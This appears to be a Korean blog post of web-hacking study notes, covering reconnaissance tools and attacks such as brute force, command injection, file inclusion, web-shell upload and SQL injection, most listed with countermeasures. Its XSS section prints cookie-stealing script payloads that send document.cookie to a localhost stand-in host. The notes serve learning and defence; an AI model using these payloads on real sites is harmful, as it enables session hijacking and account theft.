---
layout: single
title: "해킹 공부 자료"
categories: Hacking
tag: [Hacking, backend, sample]
toc: true # table of content 콘텐츠 목록
author_profile: false
sidebar:
  nav: "docs"
---

**[공지사항]** [푸샤 깃허브 블로그 업데이트 사항](https://github.com/de24world/de24world.github.io)
{: .notice--info}

<img src="/assets/images/CLS/width_height.gif" />

### xampp 실행법

```
sudo /opt/lampp/manager-linux-x64.run
```

## 정보수집(Information Gathering)

해킹에 앞서 Target에 대한 정보를 수집하는 것이 중요한데, 여러가지 Tools들을 이용하여 정보를 수집할 수 있다. 수집한 정보를 이용하여 Target의 취약점을 분석하고 공격할 수 있는 방법을 늘린다. 알아낼 수 있는 정보들로는 DNS 정보 수집, 네트워크 정보 수집, 호스트 정보 수집, OS 정보 수집, 서비스 목록화, 네트워크 범위 파악, 활성화된 머신 식벼, 개방 포트 탐색, 서비스 식별, `말테고(maltego)`를 이용한 위협 평가, 네트워크 매핑 등이 있다.

[해킹을 위한 사전준비, Port Scan](https://youtu.be/BFbXZIaQYxs){% include video id="BFbXZIaQYxs" provider="youtube" %}

### 정보 수집방법

- 배너 그래빙(banner grabbing): 서버 응답을 통해 정보를 수집하는 방법. 구글 크롬 네트워크 탭에서 확인 가능하다

- Dirbuster : url을 자동입력하여 숨겨진 파일 등 웹어플리케디션 구조를 파악할 수 있다.(칼리리눅스 내장)

- robots.txt : robots.txt는 웹사이트에 웹 크롤러같은 로봇들의 접근을 제어하기 위한 규약이다. 아직 권고안이라 꼭 지킬 의무는 없다. 크롤러들은 주로 검색엔진들의 인덱싱 목적으로 사용되는데, 웹사이트들 입장에서도 더 많은 검색 노출을 원하는게 일반적이므로 딱히 막을 이유는 없다. 다만 서버의 트래픽이 한정돼있거나 검색엔진에의 노출을 원하지 않는 경우, 이 robots.txt에 “안내문” 형식으로 특정 경로에 대한 크롤링을 자제해 줄 것을 권고하는 것이다. 지킬 의무가 없다고 하나 지켜주는 게 상식이며, 마찬가지로 서버 주인 입장에서는 규칙을 지키지 않는 크롤링이 들어오는데도 계속해서 서비스를 제공할 의무 또한 없으므로 크롤러의 아이피를 차단하면 그만이다. robots.txt는 웹사이트의 최상위 경로(=루트)에 있어야 한다.

### 정보 수집 Tools

1. [Whois Look up](https://whois.domaintools.com/) - Find info about the owner of the target
   : 웹사이트의 도메인, IP 주소, 서버 타입 등의 정보를 알 수 있다.

2. [Netcraft Site Report](https://sitereport.netcraft.com/?url=) - Shows technologies used on the target

3. [Robtex DNS lookup](https://www.robtex.com/) - Shows comprehensive info about the target website.

4. [Maltego](https://www.maltego.com/product-features/) - Maltego is an information gathering tool that can be used to collect information about anything. To run maltego type the follwing in terminal `maltegoce`

[Maltego 설치방법 in KaliLinux](https://installati.one/kalilinux/maltego/)

## 공격 방법

### Brute Force(브루트포스, 무차별 대입)

- 비밀번호 알아내기 위해서. 버프스위트의 intruder를 이용

1. 자동브루트포스 공격 - 무작위로 변수 넣어 입력
2. Dictionary Attacks(딕션너리 공격) - 조합된 정보(예:유저개인정보) 이용

- 대응방법: 유저는 비밀번호 길게 특수문자 조합하여. 개발자는 settimeout response(medium) 혹은 3회 초과시 한참 뒤에 사용가능(이를 이용하여 해당 유저 로그인 막을 수 있음). 가장 확실한 방법은 recaptcha 사용

### Command Injection(커맨드인젝션)

- 웹 요청 메시지에 임의의 시스템 명령어를 삽입하고 전송, 웹 서버에서 해당 명령어를 실행하도록 하는 공격(웹을 통해서 시스템 명령어(command)를 실행하는 공격)
- 대응방법 : validation 유효값 입력. 예: 이메일 입력시 @....com 유효성 검사 등

### 세션

- 세션(Session)이란 일정 시간동안 같은 사용자(정확하게 브라우저를 말한다)로 부터 들어오는 일련의 요구를 하나의 상태로 보고 그 상태를 일정하게 유지시키는 기술이다. 방문자의 요청에 따른 정보를 방문자 메모리에 저장하는 것이 아닌 웹 서버가 세션 아이디 파일을 만들어 서비스가 돌아가고 있는 서버에 저장하는 것이다

1. 세션 하이재킹 - 특정 사용자의 세션을 탈취하는 해킹 기법이다
2. 패킷 스니핑 - 자신의 컴퓨터 주변의 패킷을 도청하는 해킹 기법이다

- 대응방법: 암호화와 지속적 인중(시간 지나면 로그아웃), 168p/186

### CSRF(Cross-site Request Forgery, 사이트 간의 요청 위조)

- 대응방법 : Referrer 검증 / Security Token 사용 / CAPTCHA 사용/ Double Submit Cookie Pattern

### 파일인클루젼(File Inclusion)

- 지정한 파일을 PHP include()로 소스코드에 삽입

1. 로컬파일인클루젼(LFI) - 이미 시스템에 존재하는 파일을 인클루드
2. 리모트(RFI) - 외부에 있는 파일을 원격으로 인클루드

- 대응방법 : 가장 좋은 경우는 사용자 입력을 통해 파일이 전달되지 않도록 하는 거지만 어쩔 수 없는 경우엔 꼭 필요한 파일만 사용하도록 철저히 검사한다

### 파일 업로드(File Upload)

- 파일이 업로드 되는 페이지(게시판, SNS 등)에 악성파일(웹쉘)을 업로드

1. 칼리리눅스에 내장된 Weevely라는 툴을 이용하여 피해 대상 웹 서버에 웹셸을 업로드하고 원격에서 실행시킬 수 있다.

- 대응방안 : type 및 파일 확장명 제한 / 업로드 된 파일을 랜덤하게 생성 / 웹서버, 웹어플리케이션 분리

### CAPTCHA 공격

- 대응방안 : 디버기용 코드 배포시 꼭 제거.

### XSS(cross-site scripting) 공격

- 사이트 간 스크립팅(또는 크로스 사이트 스크립팅, 영문 명칭 cross-site scripting, 영문 약어 XSS)은 웹 애플리케이션에서 많이 나타나는 취약점의 하나로 웹사이트 관리자가 아닌 이가 웹 페이지에 악성 스크립트를 삽입할 수 있는 취약점이다.

- 클라이언트 쪽의 웹브라우저를 공격하는 기법. `<script>`와 같은 입력값이 그대로 웹페이지에 표시되면 위험. 자바스크립트를 이용해 세션쿠키를 탈취. 혹은 `<img src=x onerror=window.location.assign("http://127.0.0.1/hacked.php)>` 이나 `<svg>` 태그도 시도해볼 수 있다.

1. Reflected XSS 공격

- 피싱을 하여 사용자가 `<script>` 포함된 링크를 클릭하게 하여 세션값을 탈취할 수 있다(URL 인코딩 필수)
- `<script>alert(1)</script>` 값을 input 값에 입력해보아서 해당 공격방법이 통하는지 체크해볼 수 있다.

2. Stored XSS 공격

- 서버에 직접 `<script>`코드를 삽입. 예로 `<script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>

3. BeEF xss framework 사용.

- 대응방안 : php의 경우 `htmlspecialchars`이라는 함수를 사용한다. 그럼 `<>` 태그가 작동하지 않는다.

### sql 인젝션

Command option : 198p

- 대응방안 : input 값을 모두 유효성 검사 처리

### 공격 Tools

#### Weevely

- 파일 업로드 공격시 사용하는 Tools로서 피해 대상 웹 서버에 웹셸을 업로드하고 원격에서 실행시킬 수 있다. (칼리 리눅스 내장)

#### BeEF xss framework

- XSS(cross-site scripting) 공격시 사용
  [클라이언트 브라우저 공격 BeeF 프레임워크 칼리리눅스 2020 설치 과정](https://youtu.be/gj42SCd2Ib4){% include video id="gj42SCd2Ib4" provider="youtube" %}

#### [exploit-db](https://www.exploit-db.com/)

- 프로그램, 운영체제, 데이터베이스, 전송 및 보안 장비/운영체제에 대한 취약점 분석 코드 제공
- Kali Linux에는 exploit-db에서 제공하는 취약점 코드드들이 내장되어 있음

## 사후 처리

## 기타 팁

1. 윈도우 -> 가상머신
   윈도우에서 복사 Ctrl + c

가상머신에서 붙여넣기 Shift + Insert

2. 가상머신 -> 윈도우
   가상머신에서 복사 Ctrl + Insert

윈도우에 붙여넣기 Ctrl + v

3. 가상머신에서 복사 및 붙여넣기
   가상머신에서 복사 Ctrl + Insert

가상머신에 붙여넣기 Shift + Insert

### 참조영상

[화이트해커][웹모의해킹] 9강. 웹 해킹 보안 실습용 웹 어플 DVWA 설치 : https://youtu.be/yWwlO0wuNac

<div class="notice--success">
<h2>요약</h2>
<ul>
  <li>1. </li>
  <li>2. </li>
  <li>3. </li>
</ul>
</div>

#### 참고 영상

- [Github 블로그](https://youtu.be/q0P3TSoVNDM){% include video id="q0P3TSoVNDM" provider="youtube" %}

#### 참조 문서 및 사이트

- []()

[상단으로](#svg-란){: .btn .btn--primary}
[푸샤 깃허브 이동](https://github.com/de24world){: .btn .btn--info}
